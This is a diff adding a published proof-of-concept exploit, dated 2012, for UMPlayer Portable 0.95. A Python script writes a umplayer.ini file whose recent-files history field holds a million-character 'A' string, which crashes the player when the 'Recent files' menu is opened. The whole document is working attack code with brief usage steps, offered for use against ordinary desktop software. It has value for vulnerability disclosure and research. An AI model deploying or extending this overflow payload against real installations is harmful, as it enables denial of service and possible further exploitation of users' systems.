@@ -1,0 +1,60 @@
+# Exploit Title: UMPlayer (Portable Edition)
+# Date: 2012-11-28
+# Exploit Author: p3kok
+# Vendor Homepage: http://www.umplayer.com/
+# Software Link: http://sourceforge.net/projects/umplayer/ or http://www.umplayer.com/download/
+# Version: 0.95(Portable Edition) Compiled 4.7.0
+# Tested on: xp sp 2
+
+###### Crash POC ###### 
+# Aplication Crashed when mouse over on "Recent files" submenu under "Open" menu 
+# 1. Generate umplayer.ini file with this code
+# 2. Put umplayer.ini file in UMPlayerPortable directory
+# 2. Open UMPlayer.exe
+# 3. From "Open" menu, Clik "Recent files" and got the crash
+
+file =("[%General]" + "\n"
+"mplayer_bin=mplayer/mplayer.exe" + "\n"
+"driver\\vo=\"directx,\"" + "\n"
+"driver\\ao=dsound" + "\n"
+"use_screenshot=true" + "\n"
+"screenshot_directory=./screenshots" + "\n"
+"recordings_directory=./recordings" + "\n"
+"dont_remember_media_settings=false" + "\n"
+"dont_remember_time_pos=false" + "\n"
+"audio_lang=" + "\n"
+"subtitle_lang=" + "\n"
+"use_direct_rendering=false" + "\n"
+"use_double_buffer=true" + "\n"
+"use_soft_video_eq=false" + "\n"
+"use_slices=false" + "\n"
+"autoq=6" + "\n"
+"add_blackborders_on_fullscreen=false" + "\n"
+"turn_screensaver_off=false" + "\n"
+"avoid_screensaver=true" + "\n"
+"use_soft_vol=true" + "\n"
+"softvol_max=110" + "\n"
+"use_scaletempo=-1" + "\n"
+"use_hwac3=false" + "\n"
+"use_audio_equalizer=true" + "\n"
+"global_volume=true" + "\n"
+"volume=50" + "\n"
+"mute=false" + "\n"
+"autosync=false" + "\n"
+"autosync_factor=100" + "\n"
+"use_mc=false" + "\n"
+"mc_value=0" + "\n"
+"loop=false" + "\n"
+"osd=0" + "\n"
+"file_settings_method=hash" + "\n"
+"font_cache=false" + "\n"
+"playCount=11" + "\n" + "\n" )
+
+junk = "\x41" * 1000000
+file+="[history]" + "\n"
+file+="recents=" + junk
+
+out_file = open("umplayer.ini",'w')
+out_file.write(file)
+out_file.close()
+
